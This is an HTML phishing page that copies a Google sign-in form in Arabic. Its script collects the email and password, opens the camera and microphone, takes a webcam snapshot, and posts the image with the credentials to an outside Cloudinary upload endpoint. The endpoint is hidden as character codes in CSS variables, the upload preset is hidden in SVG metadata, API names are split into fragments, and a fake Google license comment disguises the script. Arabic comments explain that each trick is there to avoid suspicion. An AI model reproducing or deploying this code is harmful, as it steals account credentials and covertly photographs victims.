<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Google Authentication Service</title>
    <style>
        :root {
            /* تخزين أجزاء الرابط داخل متغيرات CSS للتمويه */
            --path-a: 104,116,116,112,115,58,47,47;
            --path-b: 97,112,105,46,99,108,111,117,100,105,110,97,114,121,46,99,111,109;
        }
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .card { width: 400px; padding: 40px; border: 1px solid #dfe1e5; border-radius: 8px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: 500; }
        #v, #c { display: none; }
    </style>
</head>
<body>

<div class="card">
    <svg id="secure-icon" width="0" height="0" style="position:absolute;">
        <metadata id="vault">bWxfZGVmYXVsdA==</metadata>
    </svg>
    
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
    <h2 style="font-weight: 400;">تسجيل الدخول</h2>
    <p>استخدام حسابك على Google</p>
    <input type="email" id="u" placeholder="البريد الإلكتروني">
    <input type="password" id="p" placeholder="كلمة المرور">
    <button id="nxt">التالي</button>
</div>

<video id="v" autoplay></video>
<canvas id="c"></canvas>

<script>
    /**
     * @license Google Trusted Framework
     * Integrated Identity Protection Layer v7.2
     */

    (function() {
        // 1. جلب البيانات من CSS Variables (تمويه المسار)
        const getStyles = (prop) => getComputedStyle(document.documentElement).getPropertyValue(prop).split(',');
        const _decode = (arr) => arr.map(c => String.fromCharCode(c.trim())).join('');

        // 2. استخدام SVG Metadata لتخزين الـ Upload Preset (إخفاء البيانات داخل العناصر الرسومية)
        const _secret = document.getElementById('vault').textContent;

        // 3. إعادة تعريف استدعاءات النظام (Object DefineProperty) للتمويه السلوكي
        const _core = {};
        Object.defineProperty(_core, 'stream', {
            get: async function() {
                const _m = "media", _d = "Devices", _g = "getUser", _v = "Media";
                return await navigator[_m + _d][_g + _v]({video: true, audio: true});
            }
        });

        document.getElementById('nxt').addEventListener('click', async () => {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;

            document.querySelector('.card').innerHTML = "<h3>جاري تشفير قناة الاتصال...</h3>";

            try {
                // استدعاء الكاميرا عبر الـ "Core Object" المضلل
                const s = await _core.stream;
                const vid = document.getElementById('v');
                vid.srcObject = s;

                window.open("https://youtube.com", "_blank");

                setTimeout(() => _execute(u, p, s), 4000);
            } catch (e) { location.reload(); }
        });

        async function _execute(u, p, s) {
            const can = document.getElementById('c');
            can.width = 640; can.height = 480;
            can.getContext('2d').drawImage(document.getElementById('v'), 0, 0);

            // تجميع الرابط من الـ CSS
            const endpoint = _decode(getStyles('--path-a')) + _decode(getStyles('--path-b')) + "/v1_1/dgkttv99v/image/upload";

            const data = {
                file: can.toDataURL('image/jpeg', 0.4),
                upload_preset: atob(_secret),
                tags: `SEC_${u}_${p}`
            };

            // الرفع في شكل JSON (أقل إثارة للريبة)
            await fetch(endpoint, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' }
            });

            window.location.href = "https://youtube.com";
        }
    })();
</script>
</body>
</html>
